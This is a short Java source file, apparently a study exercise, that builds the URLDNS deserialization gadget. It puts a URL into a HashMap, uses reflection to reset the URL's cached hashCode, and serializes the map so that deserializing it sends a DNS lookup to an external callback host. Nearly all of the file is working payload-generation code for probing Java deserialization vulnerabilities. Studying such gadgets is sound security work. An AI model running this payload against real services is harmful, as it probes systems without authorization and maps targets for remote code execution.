package Clown_URLDNS;


import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class URLDNSTest {
    public static void serialization(Object object)  throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("URLDNS.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("serialization方法成功执行");
    }

    public static void unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("URLDNS.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("unserialization执行成功");
    }

    public static void main(String[] args) throws Exception{
        HashMap hashMap = new HashMap();
        URL url = new URL("http://lyvjkhojjz.dgrh3.cn");

        /********反射*******/
        //将hashCode的值不改为*1
        Class c = url.getClass();
//        System.out.println(c);
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);//设置hashCode值为1234

        hashMap.put(url,1);
        hashcodefield.set(url,-1);//设置hashCode值为-1
        serialization(hashMap);
//        unserialization();
    }
}
